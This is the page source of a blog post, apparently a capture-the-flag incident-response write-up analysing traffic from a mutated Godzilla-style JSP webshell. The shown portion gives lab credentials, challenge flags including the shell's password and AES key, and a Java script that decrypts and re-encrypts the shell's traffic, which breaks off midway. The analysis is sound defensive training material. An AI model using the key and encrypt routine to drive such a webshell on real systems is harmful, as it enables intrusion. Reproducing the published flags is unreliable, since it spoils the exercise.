@@ -1,0 +1,693 @@
+<!DOCTYPE html>
+<html itemscope itemtype="http://schema.org/WebPage" lang="en">
+  <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+    
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+    <meta name="robots" content="noodp" />
+    <title>某变异Webshell流量分析 - xia0le&#39;s Blog</title><meta name="author" content="">
+<meta name="author-link" content="">
+<meta name="description" content="某变异Webshell流量分析 某变异Webshell流量分析 1 2 3 用户名：root 密码：xj@byshell ssh root@ip -p 222 1、黑客上传的木马文件名" /><meta name="keywords" content='应急响应, 玄机, 哥斯拉流量分析' /><meta itemprop="name" content="某变异Webshell流量分析">
+<meta itemprop="description" content="某变异Webshell流量分析 某变异Webshell流量分析 1 2 3 用户名：root 密码：xj@byshell ssh root@ip -p 222 1、黑客上传的木马文件名"><meta itemprop="datePublished" content="2024-12-30T21:47:44+08:00" />
+<meta itemprop="dateModified" content="2024-12-30T21:47:44+08:00" />
+<meta itemprop="wordCount" content="2294"><meta itemprop="image" content="http://localhost:1313/logo.png" />
+<meta itemprop="keywords" content="应急响应,玄机,哥斯拉流量分析," /><meta property="og:title" content="某变异Webshell流量分析" />
+<meta property="og:description" content="某变异Webshell流量分析 某变异Webshell流量分析 1 2 3 用户名：root 密码：xj@byshell ssh root@ip -p 222 1、黑客上传的木马文件名" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="http://localhost:1313/posts/%E6%9F%90%E5%8F%98%E5%BC%82webshell%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/" /><meta property="og:image" content="http://localhost:1313/logo.png" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2024-12-30T21:47:44+08:00" />
+<meta property="article:modified_time" content="2024-12-30T21:47:44+08:00" />
+
+<meta name="twitter:card" content="summary_large_image" />
+<meta name="twitter:image" content="http://localhost:1313/logo.png" /><meta name="twitter:title" content="某变异Webshell流量分析"/>
+<meta name="twitter:description" content="某变异Webshell流量分析 某变异Webshell流量分析 1 2 3 用户名：root 密码：xj@byshell ssh root@ip -p 222 1、黑客上传的木马文件名"/>
+<meta name="twitter:site" content="@XL_xiaole"/>
+<meta name="application-name" content="FixIt">
+<meta name="apple-mobile-web-app-title" content="FixIt"><meta name="theme-color" data-light="#f8f8f8" data-dark="#252627" content="#f8f8f8"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+    <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="http://localhost:1313/posts/%E6%9F%90%E5%8F%98%E5%BC%82webshell%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/" /><link rel="prev" href="http://localhost:1313/posts/%E5%93%A5%E6%96%AF%E6%8B%89ekp%E7%89%88%E6%9C%AC%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"><link rel="stylesheet" href="/lib/animate/animate.min.css"><script type="application/ld+json">
+  {
+    "@context": "http://schema.org",
+    "@type": "BlogPosting",
+    "headline": "某变异Webshell流量分析",
+    "inLanguage": "en",
+    "mainEntityOfPage": {
+      "@type": "WebPage",
+      "@id": "http:\/\/localhost:1313\/posts\/%E6%9F%90%E5%8F%98%E5%BC%82webshell%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90\/"
+    },"genre": "posts","keywords": "应急响应, 玄机, 哥斯拉流量分析","wordcount":  2294 ,
+    "url": "http:\/\/localhost:1313\/posts\/%E6%9F%90%E5%8F%98%E5%BC%82webshell%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90\/","datePublished": "2024-12-30T21:47:44+08:00","dateModified": "2024-12-30T21:47:44+08:00","publisher": {
+      "@type": "Organization",
+      "name": ""},"author": {
+        "@type": "Person",
+        "name": "xia0le"
+      },"description": ""
+  }
+  </script></head>
+  <body data-header-desktop="sticky" data-header-mobile="auto"><script>(window.localStorage?.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('auto' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'auto' === 'dark')) && document.body.setAttribute('data-theme', 'dark');</script><div class="wrapper" data-page-style="normal"><header class="desktop animate__faster" id="header-desktop">
+  <div class="header-wrapper">
+    <div class="header-title">
+      <a href="/" title="xia0le&#39;s Blog"><span id="typeit-header-desktop" class="typeit"></span></a><span class="header-subtitle"></span></div>
+    <nav>
+      <ul class="menu"><li class="menu-item">
+              <a
+                class="menu-link"
+                href="/posts/"
+                
+                
+              >Posts</a></li><li class="menu-item">
+              <a
+                class="menu-link"
+                href="/categories/"
+                
+                
+              >Categories</a></li><li class="menu-item">
+              <a
+                class="menu-link"
+                href="/tags/"
+                
+                
+              >Tags</a></li><li class="menu-item">
+              <a
+                class="menu-link"
+                href="/about/"
+                
+                
+              >About</a></li><li class="menu-item delimiter"></li><li class="menu-item search" id="search-desktop">
+            <input type="text" placeholder="Search titles or contents ..." id="search-input-desktop">
+            <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="Search">
+              <i class="fa-solid fa-search fa-fw" aria-hidden="true"></i>
+            </a>
+            <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="Clear">
+              <i class="fa-solid fa-times-circle fa-fw" aria-hidden="true"></i>
+            </a>
+            <span class="search-button search-loading" id="search-loading-desktop">
+              <i class="fa-solid fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+            </span>
+          </li><li class="menu-item theme-switch" title="Switch Theme">
+          <i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i>
+        </li></ul>
+    </nav>
+  </div>
+</header><header class="mobile animate__faster" id="header-mobile">
+  <div class="header-container">
+    <div class="header-wrapper">
+      <div class="header-title">
+        <a href="/" title="xia0le&#39;s Blog"><span id="typeit-header-title-mobile" class="typeit"></span></a><span class="header-subtitle"></span></div>
+      <div class="menu-toggle" id="menu-toggle-mobile">
+        <span></span><span></span><span></span>
+      </div>
+    </div>
+    <nav>
+      <ul class="menu" id="menu-mobile"><li class="search-wrapper">
+            <div class="search mobile" id="search-mobile">
+              <input type="text" placeholder="Search titles or contents ..." id="search-input-mobile">
+              <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="Search">
+                <i class="fa-solid fa-search fa-fw" aria-hidden="true"></i>
+              </a>
+              <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="Clear">
+                <i class="fa-solid fa-times-circle fa-fw" aria-hidden="true"></i>
+              </a>
+              <span class="search-button search-loading" id="search-loading-mobile">
+                <i class="fa-solid fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+              </span>
+            </div>
+            <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+              Cancel
+            </a>
+          </li><li
+              class="menu-item"
+            ><a
+                  class="menu-link"
+                  href="/posts/"
+                  
+                  
+                >Posts</a></li><li
+              class="menu-item"
+            ><a
+                  class="menu-link"
+                  href="/categories/"
+                  
+                  
+                >Categories</a></li><li
+              class="menu-item"
+            ><a
+                  class="menu-link"
+                  href="/tags/"
+                  
+                  
+                >Tags</a></li><li
+              class="menu-item"
+            ><a
+                  class="menu-link"
+                  href="/about/"
+                  
+                  
+                >About</a></li><li class="menu-item menu-system">
+          <span class="menu-system-item theme-switch" title="Switch Theme"><i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i></span></li>
+      </ul>
+    </nav>
+  </div>
+</header><div class="search-dropdown desktop">
+    <div id="search-dropdown-desktop"></div>
+  </div>
+  <div class="search-dropdown mobile">
+    <div id="search-dropdown-mobile"></div>
+  </div><main class="container"><aside class="toc" id="toc-auto"><h2 class="toc-title">Contents&nbsp;<i class="toc-icon fa-solid fa-angle-down fa-fw" aria-hidden="true"></i></h2>
+      <div class="toc-content" id="toc-content-auto"></div></aside>
+
+  <aside class="aside-custom">
+    </aside>
+
+  <article class="page single">
+    <div class="header"><h1 class="single-title animate__animated animate__flipInX"><span title="Repost" class="icon-repost"><i class="fa-solid fa-share fa-fw" aria-hidden="true"></i></span><span>某变异Webshell流量分析</span>
+      </h1></div><div class="post-meta">
+      <div class="post-meta-line"><span class="post-author"><span class="author"><i class="fa-solid fa-user-circle" aria-hidden="true"></i>
+      xia0le</span></span>
+          <span class="post-category">included in <a href="/categories/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/"><i class="fa-regular fa-folder fa-fw" aria-hidden="true"></i> 应急响应</a></span></div>
+      <div class="post-meta-line"><span title="published on 2024-12-30 21:47:44"><i class="fa-regular fa-calendar-alt fa-fw me-1" aria-hidden="true"></i><time datetime="2024-12-30">2024-12-30</time></span>&nbsp;<span title="Updated on 2024-12-30 21:47:44"><i class="fa-regular fa-edit fa-fw me-1" aria-hidden="true"></i><time datetime="2024-12-30">2024-12-30</time></span>&nbsp;<span title="2294 words"><i class="fa-solid fa-pencil-alt fa-fw me-1" aria-hidden="true"></i>About 2300 words</span>&nbsp;<span><i class="fa-regular fa-clock fa-fw me-1" aria-hidden="true"></i>5 minutes</span>&nbsp;</div>
+    </div><div class="details toc" id="toc-static" data-kept="false">
+        <div class="details-summary toc-title">
+          <span>Contents</span>
+          <span><i class="details-icon fa-solid fa-angle-right" aria-hidden="true"></i></span>
+        </div>
+        <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#1黑客上传的木马文件名是什么">1、黑客上传的木马文件名是什么？</a></li>
+    <li><a href="#2黑客上传的木马连接密码是什么">2、黑客上传的木马连接密码是什么？</a></li>
+    <li><a href="#3分析黑客上传的木马找到木马通信key是什么">3、分析黑客上传的木马,找到木马通信key是什么？</a></li>
+    <li><a href="#4黑客连接webshell后执行的第一条命令是什么">4、黑客连接webshell后执行的第一条命令是什么？</a></li>
+    <li><a href="#5这个webshell是根据什么进行回显的提交ip或域名">5、这个webshell是根据什么进行回显的？（提交ip或域名）</a></li>
+    <li><a href="#6黑客留下后门的反连的ip和port是什么flagipport">6、黑客留下后门的反连的IP和PORT是什么？（flag{IP|PORT})</a></li>
+    <li><a href="#7黑客通过后门反连执行的第一条命令是什么">7、黑客通过后门反连执行的第一条命令是什么？</a></li>
+    <li><a href="#8请上机排查黑客新增的后门程序会连接到哪台恶意主机提交主机ipport如flag1270011234">8、请上机排查黑客新增的后门程序会连接到哪台恶意主机？（提交主机IP|port）如(flag{127.0.0.1|1234})</a></li>
+    <li><a href="#9黑客加密了root目录下的一个重要文件请你将解密后的文件内容作为flag提交">9、黑客加密了/root目录下的一个重要文件，请你将解密后的文件内容作为flag提交</a></li>
+    <li><a href="#10请你找到并修复入口漏洞后运行root下的check_tomcat文件将得到的flag提交">10、请你找到并修复入口漏洞后运行/root下的check_tomcat文件，将得到的flag提交</a></li>
+    <li><a href="#参考">参考</a></li>
+  </ul>
+</nav></div>
+      </div><div class="content" id="content"><h1 id="某变异webshell流量分析">某变异Webshell流量分析</h1>
+<p>某变异Webshell流量分析</p>
+<div class="highlight" id="id-1"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">用户名</span><span class="err">：</span><span class="n">root</span>
+</span></span><span class="line"><span class="cl"><span class="n">密码</span><span class="err">：</span><span class="n">xj</span><span class="nd">@byshell</span>
+</span></span><span class="line"><span class="cl"><span class="n">ssh</span> <span class="n">root</span><span class="nd">@ip</span> <span class="o">-</span><span class="n">p</span> <span class="mi">222</span></span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="1黑客上传的木马文件名是什么">1、黑客上传的木马文件名是什么？</h2>
+<p>过滤http最下面就是</p>
+<p><img loading="lazy" src="images/image-20241211143901-q8cx1dy.png" srcset="/posts/%E6%9F%90%E5%8F%98%E5%BC%82webshell%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/images/image-20241211143901-q8cx1dy.png, images/image-20241211143901-q8cx1dy.png 1.5x, /posts/%E6%9F%90%E5%8F%98%E5%BC%82webshell%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/images/image-20241211143901-q8cx1dy.png 2x" sizes="auto" data-title="image" data-alt="image" width="3840" height="1986" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}"/>​</p>
+<p>flag{hello.jsp}</p>
+<h2 id="2黑客上传的木马连接密码是什么">2、黑客上传的木马连接密码是什么？</h2>
+<p>首先是定义了两个函数一个用来base64解密，另一个用来解压缩</p>
+<p><img loading="lazy" src="images/image-20241211144148-g0fdnm9.png" srcset="/posts/%E6%9F%90%E5%8F%98%E5%BC%82webshell%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/images/image-20241211144148-g0fdnm9.png, images/image-20241211144148-g0fdnm9.png 1.5x, /posts/%E6%9F%90%E5%8F%98%E5%BC%82webshell%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/images/image-20241211144148-g0fdnm9.png 2x" sizes="auto" data-title="image" data-alt="image" width="2826" height="1256" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}"/>​</p>
+<p>随后加载了一段base64字符串</p>
+<p><img loading="lazy" src="images/image-20241211144430-4ffgu00.png" srcset="/posts/%E6%9F%90%E5%8F%98%E5%BC%82webshell%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/images/image-20241211144430-4ffgu00.png, images/image-20241211144430-4ffgu00.png 1.5x, /posts/%E6%9F%90%E5%8F%98%E5%BC%82webshell%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/images/image-20241211144430-4ffgu00.png 2x" sizes="auto" data-title="image" data-alt="image" width="2982" height="576" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}"/>​</p>
+<p>分析base64的木马，发现<code>var10_7</code>​传递给了<code>getHeader</code>​方法最后还传递给了<code>getParameter</code>​方法，这里意思就是获取<code>var10_7</code>​这个参数的值</p>
+<p><img loading="lazy" src="images/image-20241210152918-7hqllrw.png" srcset="/posts/%E6%9F%90%E5%8F%98%E5%BC%82webshell%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/images/image-20241210152918-7hqllrw.png, images/image-20241210152918-7hqllrw.png 1.5x, /posts/%E6%9F%90%E5%8F%98%E5%BC%82webshell%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/images/image-20241210152918-7hqllrw.png 2x" sizes="auto" data-title="image" data-alt="image" width="2926" height="976" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}"/>​</p>
+<p>继续向上分析看到是由P()函数的返回值来的，然后结合流量包POST里的参数也是<code>SjIHRC7oSVIE</code>​得到所以<code>SjIHRC7oSVIE</code>​大概率就是连接密码</p>
+<p><img loading="lazy" src="images/image-20241210153313-3u193ct.png" srcset="/posts/%E6%9F%90%E5%8F%98%E5%BC%82webshell%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/images/image-20241210153313-3u193ct.png, images/image-20241210153313-3u193ct.png 1.5x, /posts/%E6%9F%90%E5%8F%98%E5%BC%82webshell%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/images/image-20241210153313-3u193ct.png 2x" sizes="auto" data-title="image" data-alt="image" width="2038" height="1114" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}"/>​</p>
+<p>当然结合HTTP请求也能看出来</p>
+<p><img loading="lazy" src="images/image-20241211144825-mpuwq23.png" srcset="/posts/%E6%9F%90%E5%8F%98%E5%BC%82webshell%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/images/image-20241211144825-mpuwq23.png, images/image-20241211144825-mpuwq23.png 1.5x, /posts/%E6%9F%90%E5%8F%98%E5%BC%82webshell%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/images/image-20241211144825-mpuwq23.png 2x" sizes="auto" data-title="image" data-alt="image" width="3840" height="1986" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}"/>​</p>
+<p>flag{SjIHRC7oSVIE}</p>
+<h2 id="3分析黑客上传的木马找到木马通信key是什么">3、分析黑客上传的木马,找到木马通信key是什么？</h2>
+<p>继续分析木马看到有个K()函数</p>
+<p><img loading="lazy" src="images/image-20241208155737-t0ool11.png" srcset="/posts/%E6%9F%90%E5%8F%98%E5%BC%82webshell%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/images/image-20241208155737-t0ool11.png, images/image-20241208155737-t0ool11.png 1.5x, /posts/%E6%9F%90%E5%8F%98%E5%BC%82webshell%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/images/image-20241208155737-t0ool11.png 2x" sizes="auto" data-title="image" data-alt="image" width="1456" height="120" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}"/>​</p>
+<p>传入<code>SecretKeySpec</code>​进行加密</p>
+<p><img loading="lazy" src="images/image-20241208160208-ehy8wk9.png" srcset="/posts/%E6%9F%90%E5%8F%98%E5%BC%82webshell%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/images/image-20241208160208-ehy8wk9.png, images/image-20241208160208-ehy8wk9.png 1.5x, /posts/%E6%9F%90%E5%8F%98%E5%BC%82webshell%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/images/image-20241208160208-ehy8wk9.png 2x" sizes="auto" data-title="image" data-alt="image" width="2820" height="150" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}"/>​</p>
+<p>flag{oszXCfTeXHpIkMS3}</p>
+<h2 id="4黑客连接webshell后执行的第一条命令是什么">4、黑客连接webshell后执行的第一条命令是什么？</h2>
+<p>加密与解密脚本</p>
+<div class="highlight" id="id-2"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span><span class="lnt">51
+</span><span class="lnt">52
+</span><span class="lnt">53
+</span><span class="lnt">54
+</span><span class="lnt">55
+</span><span class="lnt">56
+</span><span class="lnt">57
+</span><span class="lnt">58
+</span><span class="lnt">59
+</span><span class="lnt">60
+</span><span class="lnt">61
+</span><span class="lnt">62
+</span><span class="lnt">63
+</span><span class="lnt">64
+</span><span class="lnt">65
+</span><span class="lnt">66
+</span><span class="lnt">67
+</span><span class="lnt">68
+</span><span class="lnt">69
+</span><span class="lnt">70
+</span><span class="lnt">71
+</span><span class="lnt">72
+</span><span class="lnt">73
+</span><span class="lnt">74
+</span><span class="lnt">75
+</span><span class="lnt">76
+</span><span class="lnt">77
+</span><span class="lnt">78
+</span><span class="lnt">79
+</span><span class="lnt">80
+</span><span class="lnt">81
+</span><span class="lnt">82
+</span><span class="lnt">83
+</span><span class="lnt">84
+</span><span class="lnt">85
+</span><span class="lnt">86
+</span><span class="lnt">87
+</span><span class="lnt">88
+</span><span class="lnt">89
+</span><span class="lnt">90
+</span><span class="lnt">91
+</span><span class="lnt">92
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">package</span> <span class="n">com</span><span class="o">.</span><span class="n">ezgame</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">javax.crypto.Cipher</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">javax.crypto.spec.SecretKeySpec</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">java.io.</span><span class="o">*</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">java.nio.file.Files</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">java.nio.file.Paths</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">java.util.Base64</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">java.util.Scanner</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">java.util.zip.GZIPInputStream</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">java.util.zip.GZIPOutputStream</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="n">public</span> <span class="k">class</span> <span class="nc">Test4</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="n">private</span> <span class="n">static</span> <span class="n">final</span> <span class="n">String</span> <span class="n">KEY</span> <span class="o">=</span> <span class="s2">&#34;oszXCfTeXHpIkMS3&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">private</span> <span class="n">static</span> <span class="n">final</span> <span class="n">String</span> <span class="n">ALGORITHM</span> <span class="o">=</span> <span class="s2">&#34;AES&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">public</span> <span class="n">static</span> <span class="n">void</span> <span class="n">main</span><span class="p">(</span><span class="n">String</span><span class="p">[]</span> <span class="n">args</span><span class="p">)</span> <span class="n">throws</span> <span class="ne">Exception</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="n">Scanner</span> <span class="n">scanner</span> <span class="o">=</span> <span class="n">new</span> <span class="n">Scanner</span><span class="p">(</span><span class="n">System</span><span class="o">.</span><span class="ow">in</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">System</span><span class="o">.</span><span class="n">out</span><span class="o">.</span><span class="n">println</span><span class="p">(</span><span class="s2">&#34;请输入一个数字(1-加密，2-解密)：&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">int</span> <span class="n">number</span> <span class="o">=</span> <span class="n">scanner</span><span class="o">.</span><span class="n">nextInt</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">        <span class="n">switch</span> <span class="p">(</span><span class="n">number</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">            <span class="k">case</span> <span class="mi">1</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">                <span class="o">//</span><span class="n">加密</span>
+</span></span><span class="line"><span class="cl">                <span class="n">byte</span><span class="p">[]</span> <span class="n">originalString</span> <span class="o">=</span> <span class="n">Files</span><span class="o">.</span><span class="n">readAllBytes</span><span class="p">(</span><span class="n">Paths</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s2">&#34;/Users/xiaole/code/java_code/gsl-ekp/src/main/java/com/ezgame/shell.class&#34;</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">                <span class="n">byte</span><span class="p">[]</span> <span class="nb">bytes</span> <span class="o">=</span> <span class="n">gzipEncode</span><span class="p">(</span><span class="n">originalString</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">                <span class="n">String</span> <span class="n">encryptedString</span> <span class="o">=</span> <span class="n">encrypt</span><span class="p">(</span><span class="nb">bytes</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">                <span class="n">System</span><span class="o">.</span><span class="n">out</span><span class="o">.</span><span class="n">println</span><span class="p">(</span><span class="s2">&#34;加密后的字符串: &#34;</span> <span class="o">+</span> <span class="n">encryptedString</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">                <span class="k">break</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">            <span class="k">case</span> <span class="mi">2</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">                <span class="o">//</span><span class="n">解密</span>
+</span></span><span class="line"><span class="cl">                <span class="n">Scanner</span> <span class="n">scanner2</span> <span class="o">=</span> <span class="n">new</span> <span class="n">Scanner</span><span class="p">(</span><span class="n">System</span><span class="o">.</span><span class="ow">in</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">                <span class="n">System</span><span class="o">.</span><span class="n">out</span><span class="o">.</span><span class="n">println</span><span class="p">(</span><span class="s2">&#34;请输入要解密base64的字符串：&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">                <span class="n">String</span> <span class="n">encryptedString2</span> <span class="o">=</span> <span class="n">scanner2</span><span class="o">.</span><span class="n">nextLine</span><span class="p">();</span> <span class="o">//</span> <span class="n">获取用户输入的字符串</span>
+</span></span><span class="line"><span class="cl">                <span class="n">scanner</span><span class="o">.</span><span class="n">close</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">                <span class="n">byte</span><span class="p">[]</span> <span class="n">decryptedBytes</span> <span class="o">=</span> <span class="n">decrypt</span><span class="p">(</span><span class="n">encryptedString2</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">                <span class="n">byte</span><span class="p">[]</span> <span class="n">ungzipBytes</span> <span class="o">=</span> <span class="n">b</span><span class="p">(</span><span class="n">decryptedBytes</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">                <span class="n">Files</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">Paths</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s2">&#34;/Users/xiaole/code/java_code/gsl-ekp/src/main/java/com/ezgame/shell_decrypted.class&#34;</span><span class="p">),</span> <span class="n">ungzipBytes</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">                <span class="n">System</span><span class="o">.</span><span class="n">out</span><span class="o">.</span><span class="n">println</span><span class="p">(</span><span class="s2">&#34;解密后的字节数组: &#34;</span> <span class="o">+</span> <span class="n">decryptedBytes</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
